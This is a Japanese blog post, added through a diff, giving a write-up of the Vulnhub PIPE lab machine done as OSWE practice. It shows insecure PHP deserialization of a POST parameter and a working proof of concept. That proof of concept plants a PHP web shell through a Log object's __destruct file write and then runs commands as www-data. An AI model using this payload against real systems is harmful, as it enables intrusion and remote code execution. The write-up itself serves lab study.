@@ -1,0 +1,132 @@
+---
+layout: post
+title:  "Writeup Vulnhub PIPE"
+date:   2022-11-03 06:27:00 +0900
+categories: security
+---
+
+※OSWEの練習のためにこのマシンに挑戦しているため、ソースコードが開示されているという前提に立っている。
+
+# レポート
+## サマリ
+このマシンでは、ユーザー入力をデシリアライズしているためRCEが可能。
+
+## RCE
+
+問題のあるコードから一部抜粋。
+
+**/var/www/html/log.php**
+
+```php
+<?php
+class Log
+{
+    public $filename = '';
+    public $data = '';
+
+    // snip
+
+    public function __destruct()
+    {
+        file_put_contents($this->filename, $this->data, FILE_APPEND);
+    }
+}
+?>
+```
+
+**/var/www/html/index.php**
+
+```php
+<?php
+include 'info.php';
+include 'log.php';
+
+// snip
+
+if (isset($_POST['param'])) {
+    $info = unserialize($_POST['param']);
+    if (strcasecmp($info->firstname, $artist->firstname) == 0 && strcasecmp($info->surname, $artist->surname) == 0){
+        echo $artist->details;
+    }
+}
+
+// snip
+?>
+```
+
+index.phpではパラメータparamをデシリアライズしているため、class Logのデシリアライズ時に__destructがコールされ、書き込み権限を有する任意のディレクトリ配下のファイルに書き込みができる。これによりWeb Shellをアップロードすることができ、RCEが可能になる。
+
+### PoC
+
+**serialize.php**
+
+```php
+<?php
+error_reporting(E_ERROR | E_PARSE);
+
+class Log
+{
+    public $filename = '';
+    public $data = '';
+}
+
+$log = new Log();
+$log->filename = "/var/www/html/images/" . $argv[1];
+$log->data = '<?php system($_GET["cmd"]);die; ?>';
+echo(serialize($log))
+?>
+```
+
+**poc.py**
+
+```python
+import requests
+import subprocess
+import sys
+
+target_ip = sys.argv[1]
+shell_file_name = "rce.php"
+
+def serialize_param():
+    print("[+] Serializing param")
+
+    result = subprocess.run("php serialize.php %s" % shell_file_name, shell=True, capture_output=True)
+
+    print("[+] Finished")
+    return result.stdout.decode('utf-8')
+
+def upload(param):
+    print("[+] Uploading reverse shell")
+
+    data = {
+        'param': param
+    }
+    requests.post("http://%s/index.php" % target_ip, data=data, proxies={'http':'127.0.0.1:8080'})
+
+    print("[+] Finished")
+
+def rce(cmd):
+    res = requests.get("http://%s/images/%s" % (target_ip, shell_file_name), params={'cmd':cmd})
+    print(res.text)
+
+if __name__ == '__main__':
+    param = serialize_param()
+    upload(param)
+    rce(sys.argv[2])
+```
+
+**command**
+
+```sh
+python3 poc.py [TARGET_MACHINE_IP] id
+```
+
+**result**
+
+```
+[+] Serializing param
+[+] Finished
+[+] Uploading reverse shell
+[+] Finished
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
